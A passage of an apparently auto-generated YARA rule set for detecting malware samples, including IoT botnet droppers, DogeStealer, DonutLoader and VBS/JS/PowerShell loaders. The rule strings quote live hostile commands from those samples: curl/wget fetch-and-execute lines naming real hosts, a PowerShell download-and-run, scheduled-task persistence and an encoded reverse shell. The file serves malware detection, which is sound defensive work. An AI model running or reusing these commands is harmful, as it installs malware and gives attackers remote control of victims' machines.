      $s2 = "var v=\"\\x05KXCNYDBC\\x0d\\x05r\\x1dU\\x1fN\\x1dI\\x18\\x1a\\x04\\x0dV\\x27\\x0d\\x0d\\x0d\\x0d\\x0aX^H\\x0d^Y_DNY\\x0a\\x16\\x" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 400KB and
      all of them
}

rule eafc08346258d2a7df6ec2125980252b0d6b8c5147e914d997d8be29f2fc0b7e_eafc0834 {
   meta:
      description = "_subset_batch - file eafc08346258d2a7df6ec2125980252b0d6b8c5147e914d997d8be29f2fc0b7e_eafc0834.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "eafc08346258d2a7df6ec2125980252b0d6b8c5147e914d997d8be29f2fc0b7e"
   strings:
      $s1 = "Higienico.Run ococomat, 0, True" fullword wide /* score: '16.00'*/
      $s2 = "TnOj = Higienico.ExpandEnvironmentStrings(\"%TEMP%\")" fullword wide /* score: '15.00'*/
      $s3 = "qdlfudttccymvdkd = qdlfudttccymvdkd & \"[system.Convert]::FromBase64String( ($IuJUJJZz -replace '" fullword wide /* score: '15.00'*/
      $s4 = "etxyfobburhiqpoh.Run \"powershell \" & (qdlfudttccymvdkd) , 0, false" fullword wide /* score: '15.00'*/
      $s5 = "Holoroso = WScript.ScriptFullName" fullword wide /* score: '14.00'*/
      $s6 = "ococomat = \"schtasks /create /tn \" & LLJZ & \" /tr \"\"\" & Tizas & \"\"\" /sc minute /mo 1\"" fullword wide /* score: '14.00'*/
      $s7 = "Higienico.Run Holoroso, 0, True" fullword wide /* score: '13.00'*/
      $s8 = "qdlfudttccymvdkd = qdlfudttccymvdkd & \";$Yolopolhggobek = ($Yolopolhggobek -replace '%JkQasDfgrTg%', '\" & replace(CacaPooolsdf" wide /* score: '13.00'*/
      $s9 = "Set Higienico = CreateObject(\"WScript.Shell\")" fullword wide /* score: '12.00'*/
      $s10 = "qdlfudttccymvdkd = qdlfudttccymvdkd & \";$Yolopolhggobek = [system.Text.Encoding]::UTF8.GetString( \"" fullword wide /* score: '12.00'*/
      $s11 = "set etxyfobburhiqpoh =  CreateObject(\"WScript.Shell\")" fullword wide /* score: '12.00'*/
      $s12 = "Holoroso = \"schtasks /delete /tn \" & LLJZ & \" /f\"" fullword wide /* score: '11.00'*/
      $s13 = "Tizas = TnOj & \"\\GLPd.vbs\"" fullword wide /* score: '11.00'*/
      $s14 = "' Tenta copiar o arquivo para a pasta tempor" fullword wide /* score: '11.00'*/
      $s15 = "Set objFSO = CreateObject(\"Scripting.FileSystemObject\")" fullword wide /* score: '10.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 7000KB and
      8 of them
}

rule ec0a8e1b3d2d1953f3589aaa0befce79ecb8d94a99467b781c3229a9d8ba3cab_ec0a8e1b {
   meta:
      description = "_subset_batch - file ec0a8e1b3d2d1953f3589aaa0befce79ecb8d94a99467b781c3229a9d8ba3cab_ec0a8e1b.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ec0a8e1b3d2d1953f3589aaa0befce79ecb8d94a99467b781c3229a9d8ba3cab"
   strings:
      $s1 = "wget http://$ip/mpsl -O- > nowrong; chmod +x nowrong; ./nowrong tplink;" fullword ascii /* score: '23.00'*/
      $s2 = "wget http://$ip/mips -O- > nowrong; chmod +x nowrong; ./nowrong tplink;" fullword ascii /* score: '23.00'*/
      $s3 = "wget http://$ip/arm5 -O- > nowrong; chmod +x nowrong; ./nowrong tplink;" fullword ascii /* score: '23.00'*/
      $s4 = "wget http://$ip/arm7 -O- > nowrong; chmod +x nowrong; ./nowrong tplink;" fullword ascii /* score: '23.00'*/
      $s5 = "wget http://$ip/arm6 -O- > nowrong; chmod +x nowrong; ./nowrong tplink;" fullword ascii /* score: '23.00'*/
      $s6 = ">/tmp/.d && cd /tmp; >/var/tmp/.d && cd /var/tmp; >/var/run/.d && cd /var/run; >/mnt/.d && cd /mnt; >/dev/.d && cd /dev; >/home/" ascii /* score: '17.00'*/
      $s7 = ">/tmp/.d && cd /tmp; >/var/tmp/.d && cd /var/tmp; >/var/run/.d && cd /var/run; >/mnt/.d && cd /mnt; >/dev/.d && cd /dev; >/home/" ascii /* score: '14.00'*/
      $s8 = ".d && cd /home; >/.d && cd /" fullword ascii /* score: '11.00'*/
      $s9 = "rm -rf nowrong .d;" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 1KB and
      all of them
}

rule DogeStealer_signature_ {
   meta:
      description = "_subset_batch - file DogeStealer(signature).vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1b6b6d7b8bc54b192a779664592e6a3a990d35195c2fe83b1803fec4a1b8fcc6"
   strings:
      $x1 = "sExecutable = \"C:\\Users\\Bruno\\AppData\\Local\\Temp\\svchost.exe\"" fullword ascii /* score: '51.00'*/
      $x2 = "sCommand = Chr(34) & sExecutable & Chr(34) & \" -NoProfile -ExecutionPolicy Bypass -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlA" ascii /* score: '44.00'*/
      $x3 = "sCommand = Chr(34) & sExecutable & Chr(34) & \" -NoProfile -ExecutionPolicy Bypass -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlA" ascii /* score: '40.00'*/
      $s4 = "oShell.Run sCommand, 0, False" fullword ascii /* score: '23.00'*/
      $s5 = "Set oShell = CreateObject(\"WScript.Shell\")" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x6553 and filesize < 1KB and
      1 of ($x*) and all of them
}

rule DogeStealer_signature__5d16308a {
   meta:
      description = "_subset_batch - file DogeStealer(signature)_5d16308a.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5d16308acec528fca1b412d9b870dab135d47ff29c5ec033443ede78c2038faa"
   strings:
      $x1 = "sExecutable = \"C:\\Users\\admin\\AppData\\Local\\Temp\\svchost.exe\"" fullword ascii /* score: '51.00'*/
      $x2 = "sCommand = Chr(34) & sExecutable & Chr(34) & \" -NoProfile -ExecutionPolicy Bypass -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlA" ascii /* score: '44.00'*/
      $x3 = "sCommand = Chr(34) & sExecutable & Chr(34) & \" -NoProfile -ExecutionPolicy Bypass -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlA" ascii /* score: '40.00'*/
      $s4 = "oShell.Run sCommand, 0, False" fullword ascii /* score: '23.00'*/
      $s5 = "Set oShell = CreateObject(\"WScript.Shell\")" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x6553 and filesize < 1KB and
      1 of ($x*) and all of them
}

rule DonutLoader_signature__4 {
   meta:
      description = "_subset_batch - file DonutLoader(signature).bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f3f98734dec69010e88c027fd37ee6dc9ff3d35afd200c6bc95c6ddba649eb91"
   strings:
      $x1 = "powershell -NoProfile -WindowStyle Hidden -Command \"$g31wItwr='ITuinw4gipC1rFUQCQ7g';$UqaHcwP2=301;$u='https:';$u+='//ap';$u+='" ascii /* score: '52.00'*/
      $s2 = "powershell -NoProfile -WindowStyle Hidden -Command \"$g31wItwr='ITuinw4gipC1rFUQCQ7g';$UqaHcwP2=301;$u='https:';$u+='//ap';$u+='" ascii /* score: '28.00'*/
      $s3 = "dding='PKCS7';$a.Key=$k;$a.IV=$i;$t=$a.CreateDecryptor();$b=$t.TransformFinalBlock($d,0,$d.Length);$s=[Text.Encoding]::UTF8.GetS" ascii /* score: '22.00'*/
      $s4 = "ownloadData($u+'?action=get_payload&key_id=a67efd4190cb0893');$a=New-Object Security.Cryptography.AesManaged;$a.Mode='CBC';$a.Pa" ascii /* score: '21.00'*/
      $s5 = ".r';$u+='obquiz';$u+='.com';$u+='/allu';$u+='ser/b';$u+='ig7/sy';$u+='stem.';$u+='php';$k=[Convert]::FromBase64String('7cFvd62Mf" ascii /* score: '18.00'*/
      $s6 = "timeout /t 5 >nul" fullword ascii /* score: '12.00'*/
      $s7 = "tring($b);Invoke-Expression $s\"" fullword ascii /* score: '8.00'*/
      $s8 = "gqAC3GTBAv4X0UsAz0eOVJ4Anzftn8u93A=');$i=[Convert]::FromBase64String('pH9ExyiKxulYBxXpDyntJg==');$d=(New-Object Net.WebClient).D" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6540 and filesize < 2KB and
      1 of ($x*) and all of them
}

rule DonutLoader_signature__5 {
   meta:
      description = "_subset_batch - file DonutLoader(signature).ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d5927b6af7b358b32d237c6490553941728e440a197f5c4c6318ff99e8a277f4"
   strings:
      $x1 = "    $IhcXGiXCqOjLDZt  = [Convert]::FromBase64String(\"nKaLkZYnS/bYfpaMISL2eCoc+1/0PxFeTN2NxegUw/c1lMVn09wywInf3goJP1OcI9zzf+6uzF" ascii /* score: '65.00'*/
      $x2 = "    $KhAqCiBfNgnVkfu = [Convert]::FromBase64String(\"0fwbkZUnS/bcfpaM3t32eJIc+1/0PxFeDN2NxegUw/c1lMVn09wywInf3goJP1OcI9zzf+6uzFy" ascii /* score: '60.00'*/
      $s3 = "ztYue/cUhltLnci9wfTpuhLG7oLNa87F+/GSpJIPIpeJeLH4CLC2ui+VoBsAzBiQYQdlLoUpQ2MLZIAFheHJPH81NEVG8a1eDDRTN8e3xSvU/keOpfASXDVO8KAwsTBN" ascii /* score: '27.00'*/
      $s4 = "axA7Pylf6v/djH8Mh9A4FMf5CCMSPxsEcQplBpPODlIbh7P/SqbAO8scYxpUGDUmpPgH8Sh6XCv1Msoe9uRsE4Io9QAcOModNMxX9dwAsFTVPl2bxhkpoSuIChvcoUTi" ascii /* score: '24.00'*/
      $s5 = "27IN+dz6HPxUbSbOXq3huYYnd8B9mzNpNRy5D/GnAF2VJUxK6srvMrvb8eRlzOXu9wolbFJ6/jyCoMTAQREKsWjJNTVhms67NEUIpalLA2g2yhjnfZALHisPyEYCLvGq" ascii /* score: '23.00'*/
      $s6 = "Z2upufR4thY/omZvDll6/z9psofjP6eWoXmXh8tqD9x0wUBP58lvsIRCqPxNhTJ8dBiLZp/62f2jZuvpgE92DgeVWkwA1/dDhaW0utA7m3WNqZHptv0I8oXDMg/gJZBC" ascii /* score: '21.00'*/
      $s7 = "vA101AAkvuLJmaqkmOfZX0qj5xrHNqLBhO7NmVSE5LCftpMQRKcLDeUjMiQ0BPs5FxFBEYEf12QEy79/7mTadFkOrnIlnVDoutJaINI0MTFGDW5sQDJr2QLn/0U5QImc" ascii /* score: '21.00'*/
      $s8 = "m7LpFBLIoCVK2GBeK6ZnBRY19/OUut1fS8971eMm/IMcw25LAgPsHBG/cbVIC8m85afnv+ZvReDVichDUMpCI9vdPWg4GAcSSdfd2UUkF0AFuvA/QzyYsX2NcXQ3qM9H" ascii /* score: '21.00'*/
      $s9 = "Y6QgCuJuRRPlixCtrUYfYpxeyvvaZghXftmSf2gH5isHyJhRP0PSLTyn5Sdgvm/40pjQZZWA5v2fzIwE38Wr3aTlqeSpyidciJm/Mnzg8rxtlazPN3yVhuGetXKzyVF2" ascii /* score: '21.00'*/
      $s10 = "bjC/CtSqX0Mex+Jr0G3DUjlAFwelYPW01EsILLp4jyroFIus2SaS94eYRRqkRgjcvmRdnr6MrOOiXiPPjzldNTrAemHtduMPgn/sq5eVH93SceLAvXbb/qMtwADkQmoZ" ascii /* score: '21.00'*/
      $s11 = "+/oeYFzS5wf0wKgVw4WHO7/TEA6vPjYmuKb31am++8ip4gSSwgECCxHOgwht/fvU/rm2uZGOSPdPnrBvR4TENWpGeaFhgWVftSgEtTg/VneyE4F3i1ZIstIAcz2Jc7uC" ascii /* score: '21.00'*/
      $s12 = "VN3xGcXVIcqQQsmDFLuQ+wXEyesi8Kdso5EY+YCLHzI2gMfBd/b0iFHg3sEm1QGVio+XrGvr0GQ2hHYwvChKBSOXTJfzz4cSzD2VQhHiRc6Th27w83LGSrBjju98x8wp" ascii /* score: '21.00'*/
      $s13 = "J+MeZDJi53D0WD3Vm5a6nHaaxqa7XbhrB6x4RCwPY6QyhBC59fou7dlLHefTp70iOMgAcMn5qt35i4DiljSSA/YOdH45K3YDqaWMsYWt6SltFVNIMsi9ZXcoyzgN2AYI" ascii /* score: '21.00'*/
      $s14 = "kCLCnkokgc+L11+n9G8t0R60l4fFn4OISBBRumaZkirtduMpz/81Rw3/1lWKD1WVEx7vkk4qrPSfNlI51sdo8kE0tn2IBAUff0x1xckuAjy+uKtHrgPYwsnujpWo/3BK" ascii /* score: '21.00'*/
      $s15 = "VxkZrgeYePJjhV8SdQYRUPila+cp4OFbyV2kxNUkKk5CP6fA9i3UIETKPE3t1ydyQ1aVFs6pCmbyspFtpw1v85D8h0IIvgilL+pcqf+Ua/i0BOmDuCN0PhhaHw72q586" ascii /* score: '21.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 13000KB and
      1 of ($x*) and 4 of them
}

rule DonutLoader_signature__07a7b4de {
   meta:
      description = "_subset_batch - file DonutLoader(signature)_07a7b4de.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "07a7b4def368dc6ae8cfec7ca9f23e8b0918590585bcd164a3ff26a326dd2341"
   strings:
      $x1 = "    $FYxnAlsvzkqVhuD = [Convert]::FromBase64String(\"uB3fU6KHozCgYO9Lgk7ncNT+MohuvC18finGxmmE08cPJ9UVo9a2NR8uxE4q1UUr3uAcFwpqSjk" ascii /* score: '69.00'*/
      $x2 = "    $FKzzvZNxxexRzqi  = [Convert]::FromBase64String(\"9UdPU6GHozCkYO9LfbHncGz+MohuvC18PinGxmmE08cPJ9UVo9a2NR8uxE4q1UUr3uAcFwpqSj" ascii /* score: '66.00'*/
      $s3 = "HyRMC9atJV18qa4QaPULQAmfKa+27ufFXDUhOtdzar4OUJxKi9kri1P0CMqNW35NFzFotZnLmyxAiq+di+6GDULwBhhUvLgsc6JfwuIZNAC61COmBrEgRrVwBgEtjgNh" ascii /* score: '24.00'*/
      $s4 = "DEHLyEbTUBOU3kXAf1CSCMms14Ol5b30cpr3u1XsfmYMwHCwhCw4LbiHQWXComes9u+RaS5gt3hxhxxIwirc24q7vf5LXLr9zVK+OhuOqzw/OTD1PPnes95YjYVB0N6u" ascii /* score: '23.00'*/
      $s5 = "JQ0TBKKWJaM4VuHHHIses7HjRJfM6guxea29DhgTYoEL4rOp2S3e6qovBCZAzRvza7t+gN5qYD8FXYr01RuLJPBgvznbcNaAAF3tneXhbKiRzaZglOGinYJ0pHum6hGS" ascii /* score: '22.00'*/
      $s6 = "QSg8cDCofndVYPiPEYMnH4zXp4KsWhStrXiBLfsZOL5IO1p/1M8fbqcO9jA0hsIbWMG0clJs5usXjsa0J0x8PCQ+RtYoq0bBtDTboWfgeSa6adU1YMZv31RvaEYEZ0tW" ascii /* score: '22.00'*/
      $s7 = "hIhwUS8ZfzCdiyN+2E5NnM62KTvD/XmeV1nsnmgcwAT8NQp7qdjuJYQbwmtHLQFZOo8UKLogKp9IISPNXl+whmds9xDndhz1uSEyeh3RPyOQ+Xbi8+/a6bXvhGO3V9Ud" ascii /* score: '21.00'*/
      $s8 = "HgN+T9SCtPsgqNYslXtIMJxedd9JH2kA4aMoKJToypQIOJe6rqZaE3DXqR8ZzlDUMpHn01xxYAKaeW4xWoxiN95CJFjnjYX6AGZudXZJ6xdSU/YDBPs3ltiVIDE4KLTk" ascii /* score: '21.00'*/
      $s9 = "wMyk1XcLeK6IIFCDBxNT9E6VxFHX9zLq7IWFRDllMR8L8EYEhSykvFIseHVKIK9XRcyqfcGdOs2ZveTxhjR1Iu8xdxLNT3Md8Qv/p3q5oMvWMf5ovrNdbrl0astLszod" ascii /* score: '21.00'*/
      $s10 = "aCzFvWepMX0Ackhedvh9PZgrm+OXXZbgkOwaa5HddUMPHMjfc2dPXZWCoHvpjRRY/hqXfwLd3QqV5Sx3ksnrJv0JU1Yvnc402DpKEL0e9wPXvWl3SfY8LT/CRY46187L" ascii /* score: '21.00'*/
      $s11 = "RQ981whWI8tPR6/Nd1qSw+W+fHLkxwB8Z8wTLpFxm9VBHEAw8khEwwOdurSdPgLvdAmN2H1zd+WT6xVC1jisBKKomFLb5LY5GcNuaCdumpvq/mk3SQJiEV7eWYPYaCL8" ascii /* score: '21.00'*/
      $s12 = "t85P8lsICvubPrUNfcd8jE2hVpPzzlDcgr8ccxpjBR0aOW8n30Eh9tzFd/Qnbu9uTFyjXqDMfGE4ZNpqpQqKoXmQnCS0Yi6xra+EteMPc8o8fwPhZZyGBl/SXKa3hhh/" ascii /* score: '21.00'*/
      $s13 = "OUaQtAwcUhDdjx52kU1S0Nmg2/Gg+iYDrvujILjTzWzIBbqCT6QUR0KTGTvSsG1N4kWJ0UJG7j8cjQUQeS1UDb2xqo+WzIExjJCvDeDuMP6OVT53RfwqgRd/Zb6fA84R" ascii /* score: '21.00'*/
      $s14 = "ZoQ2STydUmpXrI5Uf+s4yB7uh9VEtlKKGzULDjhxRzx9Fm3YNucU04bd29xbL/jG3+5/jXXg51STRxh05ao6L4Nae+hHzM+osuCTLD31URc2gJiFvJ26dZSITm8wBFBX" ascii /* score: '21.00'*/
      $s15 = "CykFf/7ht7CGZKFYqWYnOvBSe8VS7/6lfriSj7zftPjVVpt74Ey7+hU4GK6PPXtzNkKWyie5lR8qYAFGTyfzpq+kh1bOr1qnloGwFtdQGj1BI1l+SO7RG718TYBLdart" ascii /* score: '21.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 14000KB and
      1 of ($x*) and 4 of them
}

rule e0478c41f0db6ca3ebfab4395a3cbacf7916dfc17b3ef8bf4a1cd3bac87dfc60_e0478c41 {
   meta:
      description = "_subset_batch - file e0478c41f0db6ca3ebfab4395a3cbacf7916dfc17b3ef8bf4a1cd3bac87dfc60_e0478c41.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e0478c41f0db6ca3ebfab4395a3cbacf7916dfc17b3ef8bf4a1cd3bac87dfc60"
   strings:
      $s1 = "curl http://41.216.189.108/00101010101001/sora.spc; chmod 777 sora.spc; ./sora.spc android" fullword ascii /* score: '18.00'*/
      $s2 = "curl http://41.216.189.108/00101010101001/sora.ppc; chmod 777 sora.ppc; ./sora.ppc android" fullword ascii /* score: '18.00'*/
      $s3 = "curl http://41.216.189.108/00101010101001/sora.arm; chmod 777 sora.arm; ./sora.arm android" fullword ascii /* score: '18.00'*/
      $s4 = "curl http://41.216.189.108/00101010101001/sora.arm7; chmod 777 sora.arm7; ./sora.arm7 android" fullword ascii /* score: '15.00'*/
      $s5 = "curl http://41.216.189.108/00101010101001/sora.mips; chmod 777 sora.mips; ./sora.mips android" fullword ascii /* score: '15.00'*/
      $s6 = "curl http://41.216.189.108/00101010101001/sora.mpsl; chmod 777 sora.mpsl; ./sora.mpsl android" fullword ascii /* score: '15.00'*/
      $s7 = "curl http://41.216.189.108/00101010101001/sora.x86_64; chmod 777 sora.x86_64; ./sora.x86_64 android" fullword ascii /* score: '15.00'*/
      $s8 = "curl http://41.216.189.108/00101010101001/sora.m68k; chmod 777 sora.m68k; ./sora.m68k android" fullword ascii /* score: '15.00'*/
      $s9 = "curl http://41.216.189.108/00101010101001/sora.sh4; chmod 777 sora.sh4; ./sora.sh4 android" fullword ascii /* score: '15.00'*/
      $s10 = "curl http://41.216.189.108/00101010101001/sora.arm6; chmod 777 sora.arm6; ./sora.arm6 android" fullword ascii /* score: '15.00'*/
      $s11 = "curl http://41.216.189.108/00101010101001/sora.arm5; chmod 777 sora.arm5; ./sora.arm5 android" fullword ascii /* score: '15.00'*/
      $s12 = "curl http://41.216.189.108/00101010101001/sora.x86; chmod 777 sora.x86; ./sora.x86 android" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x7563 and filesize < 3KB and
      8 of them
}

rule e151eec4593cb06057ee0a43ade0b55509805f1ca3a686b4aeff1da57bfbdb0c_e151eec4 {
   meta:
      description = "_subset_batch - file e151eec4593cb06057ee0a43ade0b55509805f1ca3a686b4aeff1da57bfbdb0c_e151eec4.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e151eec4593cb06057ee0a43ade0b55509805f1ca3a686b4aeff1da57bfbdb0c"
   strings:
      $x1 = "Paleogra.ShellExecute(\"explorer.exe\",\"c:\\windows\\system32\\svchost.exe\",\"\",\"open\",0);" fullword ascii /* score: '48.00'*/
      $s2 = "Straffes.Item(0).Document.Application.ShellExecute(Debiterfor,String.fromCharCode(34)+Frakker+String.fromCharCode(34),\"\",\"ope" ascii /* score: '21.00'*/
      $s3 = "Straffes.Item(0).Document.Application.ShellExecute(Debiterfor,String.fromCharCode(34)+Frakker+String.fromCharCode(34),\"\",\"ope" ascii /* score: '21.00'*/
      $s4 = "Alipte = \"Get-DiskSNV;function Corse ($afga){ $panadetran=3;do {$medi+=$afga[$panadetran];$optaendt=Compare-Object rdjede detai" ascii /* score: '19.00'*/
      $s5 = "var Frakker = \"$Atopysn=$env:appdata+'\\\\idrbri';$Overstt=(Get-Item $Atopysn).OpenText().ReadToEnd();$Stym=$Overstt[4364..4366" ascii /* score: '18.00'*/
      $s6 = "var Hist = bewrap.ExpandEnvironmentStrings(\"%APPDATA%\")+'\\\\idrbri';" fullword ascii /* score: '18.00'*/
      $s7 = "var Frakker = \"$Atopysn=$env:appdata+'\\\\idrbri';$Overstt=(Get-Item $Atopysn).OpenText().ReadToEnd();$Stym=$Overstt[4364..4366" ascii /* score: '18.00'*/
      $s8 = "Alipte = Alipte + \"Q QGQQQlQQ,oQQQBQQQA QQlQQQ: QQCQQQH,QQOQQQC Q a ,QL QQHQQQoQQQhQQQeQQQ1QQQ1QQQ2  Q+QQQ+QQ,%QQQ$ QQlQQQnQQQk" ascii /* score: '16.00'*/
      $s9 = "//Ekskluder, byg! udviklingsprocesserne sinningness" fullword ascii /* score: '15.00'*/
      $s10 = "//Tnderklaprendes. autovaskeanlggene proabsolutism? misexecute? skringers?" fullword ascii /* score: '14.00'*/
      $s11 = "//Arbejdskataloget endnote" fullword ascii /* score: '14.00'*/
      $s12 = "Alipte = \"Get-DiskSNV;function Corse ($afga){ $panadetran=3;do {$medi+=$afga[$panadetran];$optaendt=Compare-Object rdjede detai" ascii /* score: '14.00'*/
      $s13 = "Waxcombblunthearte = \"Journaliseringssystemerne\" + \"Sjlekampes31\";" fullword ascii /* score: '14.00'*/
      $s14 = "T TTT$ TTsTTTk T.ITTTLTTTdTTTp TTA');Insuffer254 (Corse '!!!$ !,g! !l !!o!!!b ! a!!!l !!:!!!H!!!a ! l!!!v!!!b!!,r! !o!!!d!!! !!!" ascii /* score: '13.00'*/
      $s15 = "var polyestere = Belittles.GetSpecialFolder(2) + '\\\\Myogenic';" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule e190ab9210857ff5eef86393932ac4ab944dddb2692621c93a034fbcdf38e21b_e190ab92 {
   meta:
      description = "_subset_batch - file e190ab9210857ff5eef86393932ac4ab944dddb2692621c93a034fbcdf38e21b_e190ab92.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e190ab9210857ff5eef86393932ac4ab944dddb2692621c93a034fbcdf38e21b"
   strings:
      $s1 = "powershell -ep bypass -e UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAUABTAEgATwBNAEUAXABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAtAEE" ascii /* score: '28.00'*/
      $s2 = "powershell -ep bypass -e UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAUABTAEgATwBNAEUAXABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAtAEE" ascii /* score: '24.00'*/
      $s3 = "AawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADAAMwAuADkANwAuADgAOQAuADkAOAAnACwANAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGM" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s4 = "AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGc" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s5 = "AbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHM" ascii /* base64 encoded string  */ /* score: '17.00'*/
      $s6 = "AZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGE" ascii /* base64 encoded string */ /* score: '17.00'*/
      $s7 = "AYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGg" ascii /* base64 encoded string  */ /* score: '17.00'*/
      $s8 = "AcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAewAkAGMAbABpAGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGM" ascii /* base64 encoded string  */ /* score: '17.00'*/
      $s9 = "AdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGU" ascii /* base64 encoded string  */ /* score: '17.00'*/
      $s10 = "AbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0" ascii /* base64 encoded string  */ /* score: '17.00'*/
      $s11 = "AYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBlAG4" ascii /* base64 encoded string  */ /* score: '17.00'*/
      $s12 = "AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGI" ascii /* base64 encoded string */ /* score: '17.00'*/
      $s13 = "AKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQB9ACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGU" ascii /* base64 encoded string */ /* score: '17.00'*/
      $s14 = "AIABIAGkAZABkAGUAbgA=" fullword ascii /* base64 encoded string*/ /* score: '14.00'*/
   condition:
      uint16(0) == 0x6f70 and filesize < 4KB and
      8 of them
}

rule e2773afcc680bcafa076687dd51785fa99b0fba77e4765b1c4f64b6278522edd_e2773afc {
   meta:
      description = "_subset_batch - file e2773afcc680bcafa076687dd51785fa99b0fba77e4765b1c4f64b6278522edd_e2773afc.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e2773afcc680bcafa076687dd51785fa99b0fba77e4765b1c4f64b6278522edd"
   strings:
      $x1 = "cmd /c powershell -w h -ep b -c \"iex (iwr 'biokdsl.com/upd' -useb).Content\"" fullword ascii /* score: '36.00'*/
   condition:
      uint16(0) == 0x6d63 and filesize < 1KB and
      1 of ($x*)
}

rule e3e96bddc8f4ed90324a5ea434ac7e1cda76be6d14977d5aeaa720ed108332b2_e3e96bdd {
   meta:
      description = "_subset_batch - file e3e96bddc8f4ed90324a5ea434ac7e1cda76be6d14977d5aeaa720ed108332b2_e3e96bdd.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e3e96bddc8f4ed90324a5ea434ac7e1cda76be6d14977d5aeaa720ed108332b2"
   strings:
      $s1 = " sfgt54rgsdfg.textContent = \"Yoweri Museveni's National Resistance Movement (NRM) took power in 1986 after a six-year guerrilla" ascii /* score: '15.00'*/
      $s2 = "document.getElementsByTagName(W6s1cQ8)[BWkTxVX64].appendChild(VGS3vz25);" fullword ascii /* score: '12.00'*/
      $s3 = " sfgt54rgsdfg.textContent = \"Yoweri Museveni's National Resistance Movement (NRM) took power in 1986 after a six-year guerrilla" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x2f2f and filesize < 4KB and
      all of them
}

rule e43ce0ce876d35b6e80206077fd36b59e4e9ae137fb754b9d3231f77ff34e02a_e43ce0ce {
   meta:
      description = "_subset_batch - file e43ce0ce876d35b6e80206077fd36b59e4e9ae137fb754b9d3231f77ff34e02a_e43ce0ce.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e43ce0ce876d35b6e80206077fd36b59e4e9ae137fb754b9d3231f77ff34e02a"
   strings:
      $s1 = "%NSdOyOCPlJRbmjKCdrhqbUgf%\"xbbXtjyaXzRVCWHrLVgzW==[iO.coM\"" fullword ascii /* score: '18.00'*/
